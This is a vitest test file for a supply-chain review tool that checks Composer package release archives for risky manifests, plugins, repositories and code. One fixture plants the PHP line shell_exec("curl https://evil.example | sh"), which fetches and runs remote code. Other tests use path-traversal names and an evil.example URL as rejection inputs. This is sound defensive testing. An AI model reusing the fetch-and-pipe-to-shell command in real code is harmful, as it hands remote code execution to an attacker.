import { describe, expect, test } from "vitest";
import {
  composerAdapter,
  createComposerReleaseCandidateReview,
  inferComposerArtifactKind,
  isAllowedComposerArtifactUrl,
  isValidComposerPackageName,
  normalizeComposerPackageName,
  parseComposerReleaseManifest,
  pickComposerBaselineRelease,
  prepareComposerArtifact,
  selectComposerReleaseArtifact,
} from "../server/lib/adapters/composer/index.ts";
import { composerWorkflowGateAdapter } from "../server/lib/workflow-gates/composer.ts";
import { WorkflowArtifactError } from "../server/lib/github-app/artifacts.ts";

function file(path, textSample, extra = {}) {
  return {
    path,
    size: textSample.length,
    sha256: `sha-${path}`,
    flags: [],
    textSample,
    ...extra,
  };
}

function composerJson(overrides = {}) {
  return JSON.stringify({
    name: "acme/demo-package",
    version: "1.2.0",
    ...overrides,
  });
}

function manifest(overrides = {}) {
  return {
    schema: "drydock.release-artifacts.v1",
    ecosystem: "composer",
    package: "acme/demo-package",
    version: "1.2.0",
    artifacts: [{ path: "dist/demo-package-1.2.0.zip", sha256: "a".repeat(64) }],
    ...overrides,
  };
}

function stagedArtifacts(composerJsonText, extraFiles = []) {
  return [
    {
      path: "dist/demo-package-1.2.0.zip",
      files: [file("composer.json", composerJsonText), ...extraFiles],
    },
  ];
}

function previousArtifacts(composerJsonText, extraFiles = []) {
  return [
    {
      path: "baseline-1.1.0.zip",
      files: [file("composer.json", composerJsonText), ...extraFiles],
    },
  ];
}

function findingIds(review) {
  return review.ruleFindings.map((finding) => finding.ruleId);
}

describe("Composer release manifests", () => {
  test("validates manifest shape, normalizes name, and infers kinds", () => {
    const parsed = parseComposerReleaseManifest(manifest({ package: "Acme/Demo-Package" }));
    expect(parsed.package).toBe("acme/demo-package");
    expect(parsed.artifacts[0].kind).toBe("zip");

    expect(inferComposerArtifactKind("pkg.tar.gz")).toBe("tar");
    expect(inferComposerArtifactKind("pkg.tgz")).toBe("tar");
    expect(inferComposerArtifactKind("pkg.whl")).toBeNull();
  });

  test("rejects invalid names, unsafe paths, and extra artifacts", () => {
    expect(isValidComposerPackageName("acme/demo-package")).toBe(true);
    expect(isValidComposerPackageName("no-vendor")).toBe(false);
    expect(isValidComposerPackageName("acme/../evil")).toBe(false);
    expect(normalizeComposerPackageName("Acme/Demo")).toBe("acme/demo");

    expect(() =>
      parseComposerReleaseManifest(manifest({ package: "not-a-composer-name" })),
    ).toThrow(/valid Composer package name/);
    expect(() =>
      parseComposerReleaseManifest(
        manifest({ artifacts: [{ path: "../evil.zip", sha256: "a".repeat(64) }] }),
      ),
    ).toThrow(/path is not safe/);
    expect(() =>
      parseComposerReleaseManifest(
        manifest({
          artifacts: [
            { path: "a.zip", sha256: "a".repeat(64) },
            { path: "b.zip", sha256: "b".repeat(64) },
          ],
        }),
      ),
    ).toThrow(/no more than 1 artifact/);
  });
});

describe("Composer artifact preparation", () => {
  test("strips a single common archive root for stable diffs", () => {
    const prepared = prepareComposerArtifact({
      path: "dist/demo.zip",
      files: [
        file("demo-package-abc123/composer.json", composerJson()),
        file("demo-package-abc123/src/Demo.php", "<?php\n"),
      ],
    });
    expect(prepared.files.map((entry) => entry.path)).toEqual(["composer.json", "src/Demo.php"]);
    expect(prepared.summary.name).toBe("acme/demo-package");
    expect(prepared.summary.version).toBe("1.2.0");
  });

  test("leaves rootless composer-archive output untouched", () => {
    const prepared = prepareComposerArtifact({
      path: "dist/demo.zip",
      files: [file("composer.json", composerJson()), file("src/Demo.php", "<?php\n")],
    });
    expect(prepared.files.map((entry) => entry.path)).toEqual(["composer.json", "src/Demo.php"]);
  });

  test("ignores nested composer.json files for identity", () => {
    const prepared = prepareComposerArtifact({
      path: "dist/demo.zip",
      files: [
        file("composer.json", composerJson()),
        file("tests/fixtures/composer.json", composerJson({ name: "evil/decoy" })),
      ],
    });
    expect(prepared.summary.name).toBe("acme/demo-package");
  });
});

describe("Composer deterministic findings", () => {
  test("clean version bump raises nothing", () => {
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: stagedArtifacts(composerJson(), [file("src/Demo.php", "<?php\nclass Demo {}\n")]),
      previousArtifacts: previousArtifacts(composerJson({ version: "1.1.0" }), [
        file("src/Demo.php", "<?php\nclass Demo {}\n"),
      ]),
    });
    expect(review.ruleFindings).toEqual([]);
    expect(review.risk).toBe("low");
  });

  test("flags a composer plugin with a plugin-api requirement", () => {
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: stagedArtifacts(
        composerJson({
          type: "composer-plugin",
          require: { "composer-plugin-api": "^2.0" },
          extra: { class: "Acme\\Demo\\Plugin" },
        }),
      ),
      previousArtifacts: previousArtifacts(composerJson({ version: "1.1.0" })),
    });
    expect(findingIds(review)).toContain("composer.plugin");
    expect(findingIds(review)).toContain("composer.plugin-api-requirement");
    expect(review.risk).not.toBe("low");
  });

  test("suppresses plugin findings when the baseline already declared them", () => {
    const pluginJson = composerJson({
      type: "composer-plugin",
      require: { "composer-plugin-api": "^2.0" },
      extra: { class: "Acme\\Demo\\Plugin" },
    });
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: stagedArtifacts(pluginJson),
      previousArtifacts: previousArtifacts(pluginJson),
    });
    expect(findingIds(review)).not.toContain("composer.plugin");
    expect(findingIds(review)).not.toContain("composer.plugin-api-requirement");
  });

  test("flags new autoload.files, bin entries, and allow-plugins config", () => {
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: stagedArtifacts(
        composerJson({
          autoload: { files: ["src/bootstrap.php"] },
          bin: ["bin/demo"],
          config: { "allow-plugins": { "acme/installer": true } },
        }),
      ),
      previousArtifacts: previousArtifacts(composerJson({ version: "1.1.0" })),
    });
    expect(findingIds(review)).toContain("composer.autoload-files");
    expect(findingIds(review)).toContain("composer.bin-entry");
    expect(findingIds(review)).toContain("composer.allow-plugins");
  });

  test("flags custom repositories, harder for non-HTTPS urls", () => {
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: stagedArtifacts(
        composerJson({
          repositories: [
            { type: "composer", url: "https://packages.example.com" },
            { type: "vcs", url: "http://insecure.example.com/repo.git" },
          ],
        }),
      ),
      previousArtifacts: previousArtifacts(composerJson({ version: "1.1.0" })),
    });
    const repoFindings = review.ruleFindings.filter(
      (finding) => finding.ruleId === "composer.custom-repository",
    );
    expect(repoFindings.map((finding) => finding.severity).sort()).toEqual(["high", "medium"]);
  });

  test("flags replace/provide shadowing, dev stability, and insecure config", () => {
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: stagedArtifacts(
        composerJson({
          replace: { "symfony/polyfill-php80": "*" },
          provide: { "psr/log-implementation": "1.0" },
          "minimum-stability": "dev",
          config: { "secure-http": false, "preferred-install": "source" },
        }),
      ),
      previousArtifacts: previousArtifacts(composerJson({ version: "1.1.0" })),
    });
    const ids = findingIds(review);
    expect(ids).toContain("composer.package-shadowing");
    expect(ids).toContain("composer.unstable-stability");
    expect(ids.filter((id) => id === "composer.source-install")).toHaveLength(2);
  });

  test("flags manifest name and version mismatches as critical", () => {
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: stagedArtifacts(composerJson({ name: "other/package", version: "9.9.9" })),
      previousArtifacts: previousArtifacts(composerJson({ version: "1.1.0" })),
    });
    const mismatches = review.ruleFindings.filter(
      (finding) => finding.ruleId === "composer.manifest-mismatch",
    );
    expect(mismatches).toHaveLength(2);
    expect(mismatches.every((finding) => finding.severity === "critical")).toBe(true);
    expect(review.risk).toBe("critical");
  });

  test("flags a missing root composer.json", () => {
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: [
        { path: "dist/demo-package-1.2.0.zip", files: [file("src/Demo.php", "<?php\n")] },
      ],
      previousArtifacts: previousArtifacts(composerJson({ version: "1.1.0" })),
    });
    expect(findingIds(review)).toContain("composer.manifest-missing");
  });

  test("flags PHP execution capabilities on changed lines via shared code rules", () => {
    const review = createComposerReleaseCandidateReview({
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: stagedArtifacts(composerJson(), [
        file("src/Demo.php", '<?php\nshell_exec("curl https://evil.example | sh");\n'),
      ]),
      previousArtifacts: previousArtifacts(composerJson({ version: "1.1.0" }), [
        file("src/Demo.php", "<?php\nclass Demo {}\n"),
      ]),
    });
    expect(findingIds(review).some((id) => id.startsWith("code."))).toBe(true);
  });
});

describe("Composer baseline selection", () => {
  const metadata = {
    packages: {
      "acme/demo-package": [
        {
          version: "1.1.0",
          version_normalized: "1.1.0.0",
          time: "2024-02-01T00:00:00+00:00",
          dist: { type: "zip", url: "https://api.github.com/repos/acme/demo/zipball/def" },
        },
        {
          version: "1.0.0",
          version_normalized: "1.0.0.0",
          time: "2024-01-01T00:00:00+00:00",
          dist: { type: "zip", url: "https://api.github.com/repos/acme/demo/zipball/abc" },
        },
        {
          version: "1.2.0",
          version_normalized: "1.2.0.0",
          time: "2024-03-01T00:00:00+00:00",
          dist: { type: "zip", url: "https://api.github.com/repos/acme/demo/zipball/ghi" },
        },
      ],
    },
  };

  test("picks the newest published release that is not the candidate", () => {
    const selection = pickComposerBaselineRelease(
      metadata,
      parseComposerReleaseManifest(manifest()),
    );
    expect(selection.version).toBe("1.1.0");
    expect(selection.source).toBe("upload-time");
  });

  test("falls back to metadata order when timestamps are missing", () => {
    const noTimes = {
      packages: {
        "acme/demo-package": [
          { version: "1.1.0", dist: { type: "zip", url: "https://api.github.com/x" } },
          { version: "1.0.0", dist: { type: "zip", url: "https://api.github.com/y" } },
        ],
      },
    };
    const selection = pickComposerBaselineRelease(
      noTimes,
      parseComposerReleaseManifest(manifest()),
    );
    expect(selection.version).toBe("1.1.0");
    expect(selection.source).toBe("latest-published");
  });

  test("returns none when no publishable baseline exists", () => {
    const selection = pickComposerBaselineRelease(
      { packages: {} },
      parseComposerReleaseManifest(manifest()),
    );
    expect(selection.version).toBeNull();
    expect(selection.source).toBe("none");
  });

  test("selects the dist artifact for the chosen baseline version", () => {
    const remote = selectComposerReleaseArtifact(metadata, "acme/demo-package", "1.1.0");
    expect(remote).toEqual({
      version: "1.1.0",
      url: "https://api.github.com/repos/acme/demo/zipball/def",
      kind: "zip",
      sha1: null,
    });
  });

  test("allowlists only https dist hosts Packagist references", () => {
    expect(isAllowedComposerArtifactUrl("https://api.github.com/repos/a/b/zipball/x")).toBe(true);
    expect(isAllowedComposerArtifactUrl("https://codeload.github.com/a/b/legacy.zip/x")).toBe(true);
    expect(isAllowedComposerArtifactUrl("http://api.github.com/repos/a/b/zipball/x")).toBe(false);
    expect(isAllowedComposerArtifactUrl("https://evil.example.com/pkg.zip")).toBe(false);
  });
});

describe("Composer workflow-gate adapter", () => {
  function gateArtifact(path, files, sha256 = "c".repeat(64)) {
    return { path, sha256, ecosystem: "composer", kind: "zip", files, packageJson: null };
  }

  test("classifies zip and tar archives by path", () => {
    expect(composerWorkflowGateAdapter.classifyArtifact("dist/pkg.zip")).toBe("zip");
    expect(composerWorkflowGateAdapter.classifyArtifact("dist/pkg.tar.gz")).toBe("tar");
    expect(composerWorkflowGateAdapter.classifyArtifact("dist/pkg.whl")).toBeNull();
    expect(composerWorkflowGateAdapter.classifyArtifact("checksums.txt")).toBeNull();
  });

  test("content-detects a root composer.json, including under a single root dir", () => {
    expect(
      composerWorkflowGateAdapter.detectArtifact({
        files: [file("composer.json", composerJson())],
        packageJson: null,
      }),
    ).toBe("zip");
    expect(
      composerWorkflowGateAdapter.detectArtifact({
        files: [file("demo-abc/composer.json", composerJson())],
        packageJson: null,
      }),
    ).toBe("zip");
    expect(
      composerWorkflowGateAdapter.detectArtifact({
        files: [file("nested/deeper/composer.json", composerJson())],
        packageJson: null,
      }),
    ).toBeNull();
  });

  test("prepares one candidate per distinct package", () => {
    const candidates = composerWorkflowGateAdapter.prepareReleaseCandidates([
      gateArtifact("dist/demo.zip", [file("composer.json", composerJson())]),
      gateArtifact(
        "dist/other.zip",
        [file("composer.json", composerJson({ name: "acme/other", version: "2.0.0" }))],
        "d".repeat(64),
      ),
    ]);
    expect(candidates).toHaveLength(2);
    expect(candidates.map((candidate) => candidate.package)).toEqual([
      { name: "acme/demo-package", version: "1.2.0" },
      { name: "acme/other", version: "2.0.0" },
    ]);
    expect(candidates[0].pipelineInput.manifest.artifacts[0].sha256).toBe("c".repeat(64));
  });

  test("tolerates a missing composer.json version", () => {
    const candidates = composerWorkflowGateAdapter.prepareReleaseCandidates([
      gateArtifact("dist/demo.zip", [
        file("composer.json", JSON.stringify({ name: "acme/demo-package" })),
      ]),
    ]);
    expect(candidates).toHaveLength(1);
    expect(candidates[0].package.version).toBe("0.0.0-unversioned");
  });

  test("fails closed when a composer.json name is missing", () => {
    expect(() =>
      composerWorkflowGateAdapter.prepareReleaseCandidates([
        gateArtifact("dist/demo.zip", [file("composer.json", JSON.stringify({ type: "library" }))]),
      ]),
    ).toThrow(WorkflowArtifactError);
  });

  test("fails closed when two archives claim the same package", () => {
    expect(() =>
      composerWorkflowGateAdapter.prepareReleaseCandidates([
        gateArtifact("dist/demo-a.zip", [file("composer.json", composerJson())]),
        gateArtifact("dist/demo-b.zip", [file("composer.json", composerJson())], "d".repeat(64)),
      ]),
    ).toThrow(/both claim Composer package/);
  });
});

describe("Composer adapter surface", () => {
  test("exposes the adapter id, pattern set, and provenance", () => {
    expect(composerAdapter.id).toBe("composer");
    expect(composerAdapter.codePatternSet).toBe("php");
    const details = {
      manifest: parseComposerReleaseManifest(manifest()),
      artifacts: [],
      preparedArtifacts: [],
    };
    const summary = composerAdapter.summarizeDetails(details);
    expect(summary.provenance).toEqual({
      ecosystem: "composer",
      mode: "workflow_gate",
      artifacts: [{ path: "dist/demo-package-1.2.0.zip", kind: "tarball", sha256: "a".repeat(64) }],
    });
  });
});
